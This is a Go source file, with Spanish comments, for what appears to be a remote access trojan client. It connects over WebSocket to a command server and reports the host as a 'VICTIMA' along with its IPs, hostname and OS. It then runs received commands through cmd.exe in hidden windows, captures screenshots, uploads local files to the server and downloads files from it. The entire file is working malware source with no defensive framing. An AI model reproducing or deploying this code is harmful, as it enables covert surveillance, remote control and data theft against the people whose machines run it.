package main

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"image/png"
	"io"
	"io/ioutil"
	"mime/multipart"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"

	"github.com/kbinani/screenshot"
	"golang.org/x/net/websocket"
)

var (
	serverBaseURL = "192.168.0.100:5000" //192.168.0.100:5000 / dominio.com / localhost:5000
	currentDir    = "."
	env           = "development" // Cambia a "production" / "development" cuando sea necesario
)

const CREATE_NO_WINDOW = 0x08000000

// Estructuras para enviar datos
type Mensaje struct {
	Tipo  string            `json:"tipo"`
	Datos map[string]string `json:"datos,omitempty"`
}

type MensajeRecibir struct {
	Tipo    string `json:"tipo"`
	Comando string `json:"comando"`
}

type MensajeRespuesta struct {
	Tipo   string `json:"tipo"`
	Cuerpo string `json:"cuerpo"`
}

// Función principal
func main() {
	reconnectLoop()
}

func reconnectLoop() {
	for {
		if err := conectarServidor(); err != nil {
			fmt.Printf("Error en la conexión: %s. Intentando reconectar en 30 segundos...\n", err)
			time.Sleep(30 * time.Second) // Espera 30 segundos antes de intentar reconectar
		} else {
			break // Si la conexión es exitosa, sale del bucle y mantiene la conexión
		}
	}
}

func conectarServidor() error {
	// Asegura que no haya espacios en blanco en serverBaseURL
	serverBaseURL = strings.TrimSpace(serverBaseURL)

	// Detecta el protocolo adecuado: ws:// para conexiones inseguras y wss:// para conexiones seguras
	wsProtocol := "ws"
	if strings.HasPrefix(serverBaseURL, "https") || (!strings.Contains(serverBaseURL, "localhost") && !strings.HasPrefix(serverBaseURL, "127.") && !strings.HasPrefix(serverBaseURL, "192.")) {
		wsProtocol = "wss" // WebSocket seguro para producción y dominios públicos
	}

	// Construir la URL completa del servidor WebSocket
	serverURL := fmt.Sprintf("%s://%s/ws", wsProtocol, serverBaseURL)

	// Conectar al servidor WebSocket
	ws, err := websocket.Dial(serverURL, "", fmt.Sprintf("%s://%s/", wsProtocol, serverBaseURL))
	if err != nil {
		return fmt.Errorf("error conectando al servidor WebSocket: %s", err)
	}
	defer ws.Close() // Asegúrate de cerrar la conexión al salir de la función

	imprimir("Conectado al servidor WebSocket en " + serverURL)

	// Obtener datos del cliente y enviarlos
	datosCliente, err := obtenerDatosCliente()
	if err != nil {
		imprimir(fmt.Sprintf("Error obteniendo datos del cliente: %s", err))
		datosCliente = map[string]string{}
	}
	enviarMensaje(ws, "VICTIMA", datosCliente)

	// Procesar mensajes entrantes de manera continua
	for {
		var cuerpo string
		err := websocket.Message.Receive(ws, &cuerpo)
		if err != nil {
			return fmt.Errorf("error recibiendo comando: %s", err)
		}

		imprimir(fmt.Sprintf("Mensaje recibido: %s", cuerpo))

		// Deserializar el mensaje recibido
		var mensajeRecibir MensajeRecibir
		if err := json.Unmarshal([]byte(cuerpo), &mensajeRecibir); err != nil {
			return fmt.Errorf("error deserializando JSON: %s", err)
		}

		// Procesar el comando recibido
		procesarComando(ws, mensajeRecibir.Comando, mensajeRecibir.Tipo)
	}
}

// Procesa los comandos recibidos
func procesarComando(ws *websocket.Conn, comando string, tipo string) {
	cmdArgs := strings.Split(comando, " ")
	cmdName := cmdArgs[0]

	switch cmdName {
	case "cd":
		cambiarDirectorio(cmdArgs, ws)
	case "ls":
		listarArchivos(ws)
	case "pwd":
		obtenerDirectorioActual(ws)
	case "screenshot":
		if err := capturarPantalla(ws); err != nil {
			imprimir(fmt.Sprintf("Error capturando pantalla: %s", err))
		}
	case "set-file":
		if tipo == "COMANDOMASIVO" {
			descargarArchivoEnSegundoPlano(cmdArgs[1], ws, false)
		} else {
			if len(cmdArgs) > 1 {
				descargarArchivoEnSegundoPlano(cmdArgs[1], ws, true)
			}
		}
	case "get-file":
		if len(cmdArgs) > 1 {
			go subirArchivoEnSegundoPlano(cmdArgs[1], ws)
		}
	case "comand": // Nuevo comando para ejecutar cualquier comando
		if len(cmdArgs) > 1 {
			ejecutarComandoGenerico(ws, strings.Join(cmdArgs[1:], " "))
		} else {
			enviarMensaje(ws, "RESPUESTA", "Uso: comand <tu_comando>")
		}

	default:
		if tipo == "COMANDOMASIVO" {
			ejecutarComandoEnSegundoPlano(ws, comando, false)
		} else {
			ejecutarComandoEnSegundoPlano(ws, comando, true)
		}
	}
}

func ejecutarComandoGenerico(ws *websocket.Conn, comando string) {
	// Ejecuta el comando proporcionado
	cmd := exec.Command("cmd.exe", "/C", comando) // Para sistemas Windows
	output, err := cmd.CombinedOutput()           // Captura la salida y los errores

	if err != nil {
		enviarMensaje(ws, "RESPUESTA", fmt.Sprintf("Error ejecutando comando: %s", err))
		return
	}

	// Enviar la salida al servidor
	enviarMensaje(ws, "RESPUESTA", string(output))
}

// Funciones relacionadas a operaciones de sistema
func cambiarDirectorio(cmdArgs []string, ws *websocket.Conn) {
	if len(cmdArgs) < 2 {
		enviarMensaje(ws, "RESPUESTA", "Uso: cd <ruta_del_directorio>")
		return
	}

	dir := strings.Join(cmdArgs[1:], " ")
	if err := os.Chdir(dir); err != nil {
		enviarMensaje(ws, "RESPUESTA", fmt.Sprintf("Error cambiando de directorio a '%s': %s", dir, err))
		return
	}

	currentDir, err := os.Getwd()
	if err != nil {
		enviarMensaje(ws, "RESPUESTA", fmt.Sprintf("Error obteniendo el directorio actual: %s", err))
		return
	}

	enviarMensaje(ws, "RESPUESTA", fmt.Sprintf("Directorio actual cambiado a: %s", currentDir))
}

func listarArchivos(ws *websocket.Conn) {
	files, err := ioutil.ReadDir(".")
	if err != nil {
		enviarMensaje(ws, "RESPUESTA", fmt.Sprintf("Error listando archivos: %s", err))
		return
	}
	var fileList []string
	for _, file := range files {
		fileList = append(fileList, file.Name())
	}
	enviarMensaje(ws, "RESPUESTA", strings.Join(fileList, "\n"))
}

func obtenerDirectorioActual(ws *websocket.Conn) {
	currentDir, err := os.Getwd()
	if err != nil {
		enviarMensaje(ws, "RESPUESTA", fmt.Sprintf("Error obteniendo el directorio actual: %s", err))
		return
	}
	enviarMensaje(ws, "RESPUESTA", currentDir)
}

func ejecutarComandoEnSegundoPlano(ws *websocket.Conn, comando string, mostrarMensaje bool) {
	go func() {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()

		cmd := exec.CommandContext(ctx, "cmd", "/C", comando)
		cmd.Dir = currentDir
		cmd.SysProcAttr = getSysProcAttr()

		if mostrarMensaje {
			mensaje := fmt.Sprintf("Comando '%s' ejecutado correctamente en segundo plano", comando)
			enviarMensaje(ws, "RESPUESTA", mensaje)
		}

		if err := cmd.Start(); err != nil {
			if mostrarMensaje {
				enviarMensaje(ws, "RESPUESTA", fmt.Sprintf("Error iniciando el comando: %s", err))
			}
			return
		}

		if err := cmd.Wait(); err != nil {
			if mostrarMensaje {
				enviarMensaje(ws, "RESPUESTA", fmt.Sprintf("Error ejecutando el comando: %s", err))
			}
			return
		}
	}()
}

// Captura la pantalla
func capturarPantalla(ws *websocket.Conn) error {
	bounds := screenshot.GetDisplayBounds(0)
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		return fmt.Errorf("error capturando la pantalla: %s", err)
	}

	var buf bytes.Buffer
	if err := png.Encode(&buf, img); err != nil {
		return fmt.Errorf("error codificando la imagen: %s", err)
	}
	imgBase64 := base64.StdEncoding.EncodeToString(buf.Bytes())
	enviarMensaje(ws, "CAPTURA", imgBase64)
	return nil
}

// Descargar y subir archivos
func descargarArchivoEnSegundoPlano(nombreArchivo string, ws *websocket.Conn, mostrarMensaje bool) {
	go func() {
		url := fmt.Sprintf("http://%s/api/download/%s", serverBaseURL, nombreArchivo)
		imprimir(fmt.Sprintf("Descargando archivo: %s", url))

		resp, err := http.Get(url)
		if err != nil || resp.StatusCode != http.StatusOK {
			if mostrarMensaje {
				enviarMensaje(ws, "RESPUESTA-SET", fmt.Sprintf("Error descargando archivo en el cliente: %s", err))
			}
			return
		}
		defer resp.Body.Close()

		out, err := os.Create(nombreArchivo)
		if err != nil {
			if mostrarMensaje {
				enviarMensaje(ws, "RESPUESTA-SET", fmt.Sprintf("Error creando archivo local en el cliente: %s", err))
			}
			return
		}
		defer out.Close()

		if _, err := io.Copy(out, resp.Body); err != nil {
			if mostrarMensaje {
				enviarMensaje(ws, "RESPUESTA-SET", fmt.Sprintf("Error guardando archivo en el cliente: %s", err))
			}
			return
		}

		if mostrarMensaje {
			enviarMensaje(ws, "RESPUESTA-SET", fmt.Sprintf("Archivo %s descargado correctamente en el cliente", nombreArchivo))
		}
	}()
}

func subirArchivoEnSegundoPlano(nombreArchivo string, ws *websocket.Conn) {
	url := fmt.Sprintf("http://%s/api/upload", serverBaseURL)

	file, err := os.Open(nombreArchivo)
	if err != nil {
		enviarMensaje(ws, "RESPUESTA-GET", fmt.Sprintf("Error al abrir archivo: %s", err))
		return
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	part, err := writer.CreateFormFile("archivo", filepath.Base(nombreArchivo))
	if err != nil {
		enviarMensaje(ws, "RESPUESTA-GET", fmt.Sprintf("Error al crear parte del archivo en el formulario: %s", err))
		return
	}
	if _, err := io.Copy(part, file); err != nil {
		enviarMensaje(ws, "RESPUESTA-GET", fmt.Sprintf("Error al copiar contenido del archivo: %s", err))
		return
	}

	writer.Close()

	req, err := http.NewRequest("POST", url, body)
	if err != nil {
		enviarMensaje(ws, "RESPUESTA-GET", fmt.Sprintf("Error al crear solicitud HTTP: %s", err))
		return
	}

	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil || resp.StatusCode != http.StatusOK {
		enviarMensaje(ws, "RESPUESTA-GET", fmt.Sprintf("Error al subir archivo: %s", err))
		return
	}
	defer resp.Body.Close()

	bodyResp, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		enviarMensaje(ws, "RESPUESTA-GET", fmt.Sprintf("Error al leer respuesta del servidor: %s", err))
		return
	}

	enviarMensaje(ws, "RESPUESTA-GET", fmt.Sprintf("Archivo %s subido correctamente al servidor. Respuesta del servidor: %s", nombreArchivo, string(bodyResp)))
}

// Función para obtener los datos del cliente
func obtenerDatosCliente() (map[string]string, error) {
	ipLocal, _ := obtenerIpLocal()
	ipPublica, _ := obtenerIpPublica()
	hostname, _ := os.Hostname()
	sistemaOperativo := fmt.Sprintf("%s %s", runtime.GOOS, runtime.GOARCH)

	return map[string]string{
		"ipLocal":           ipLocal,
		"ipPublica":         ipPublica,
		"nombre":            hostname,
		"sistema_operativo": sistemaOperativo,
	}, nil
}

func obtenerIpLocal() (string, error) {
	interfaces, err := net.Interfaces()
	if err != nil {
		return "", err
	}

	for _, inter := range interfaces {
		if inter.Flags&net.FlagUp == 0 || inter.Flags&net.FlagLoopback != 0 {
			continue
		}
		addrs, err := inter.Addrs()
		if err != nil {
			return "", err
		}
		for _, addr := range addrs {
			ipNet, ok := addr.(*net.IPNet)
			if ok && ipNet.IP.To4() != nil {
				return ipNet.IP.String(), nil
			}
		}
	}
	return "", fmt.Errorf("no se pudo obtener la IP local")
}

func obtenerIpPublica() (string, error) {
	resp, err := http.Get("https://httpbin.org/ip")
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	var result map[string]interface{}
	if err := json.Unmarshal(body, &result); err != nil {
		return "", err
	}

	if ip, ok := result["origin"].(string); ok {
		return ip, nil
	}
	return "", fmt.Errorf("formato de respuesta inesperado")
}

// Enviar mensaje al servidor
func enviarMensaje(ws *websocket.Conn, tipo string, contenido interface{}) {
	data, err := json.Marshal(MensajeRespuesta{
		Tipo:   tipo,
		Cuerpo: fmt.Sprintf("%v", contenido),
	})
	if err != nil {
		imprimir(fmt.Sprintf("Error creando JSON para el mensaje: %s", err))
		return
	}

	err = websocket.Message.Send(ws, string(data))
	if err != nil {
		imprimir(fmt.Sprintf("Error enviando mensaje: %s", err))
	}
}

// Función para imprimir (log o consola dependiendo del entorno)
func imprimir(mensaje string) {
	if env == "development" {
		fmt.Println(mensaje)
	}
}

// Obtener configuración para ejecutar comandos sin ventana en segundo plano
func getSysProcAttr() *syscall.SysProcAttr {
	if runtime.GOOS == "windows" {
		return &syscall.SysProcAttr{
			HideWindow:    true,
			CreationFlags: CREATE_NO_WINDOW,
		}
	}
	return nil
}
